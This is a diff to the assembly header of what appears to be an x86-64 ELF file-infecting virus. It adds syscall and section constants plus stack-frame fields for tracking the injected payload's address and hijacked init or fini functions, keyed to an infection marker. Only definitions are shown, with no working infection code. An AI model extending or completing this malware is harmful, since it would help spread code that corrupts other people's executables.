@@ -11,6 +11,7 @@
 %define SYS_MSYNC       0x1a
 %define SYS_EXIT        0x3c
 %define SYS_CHDIR       0x50
+%define SYS_FCHDIR      0x51
 %define SYS_GETDENTS64  0xd9
 
 %define O_RDONLY        0
@@ -103,25 +104,29 @@ endstruc
 %define SHT_PROGBITS    1
 %define SHT_NOBITS      8
 %define SHT_INIT_ARRAY  14
+%define SHT_FINI_ARRAY  15
 
 %define INFECTION_MAGIC 0xcafefeed
 
 struc       Infection_stack_frame ; Not really a structure but it will help to clarify the code
-    filename:           resq    1
-    fd:                 resd    1
-    pad_align:          resd    1
-    e_hdr:              resb    ELFHDR_SIZE
-    file_size:          resq    1
-    map:                resq    1
-    text_phdr:          resq    1
-    data_phdr:          resq    1
-    old_entrypoint:     resq    1
-    old_text_size:      resq    1
-    last_text_shdr:     resq    1
-    init_array_shdr:    resq    1
-    bss_shdr:           resq    1
+    filename:               resq    1
+    fd:                     resd    1
+    pad_align:              resd    1
+    e_hdr:                  resb    ELFHDR_SIZE
+    file_size:              resq    1
+    map:                    resq    1
+    text_phdr:              resq    1
+    data_phdr:              resq    1
+    old_entrypoint:         resq    1
+    old_text_size:          resq    1
+    last_text_shdr:         resq    1
+    init_array_shdr:        resq    1
+    bss_shdr:               resq    1
+    old_init_func:          resq    1
+    payload_base_address:   resq    1
+    payload_base_offset:    resq    1
 endstruc
 
-%define STACK_FRAME_SIZE    0xa0
+%define STACK_FRAME_SIZE    0xb0
 
 %endif
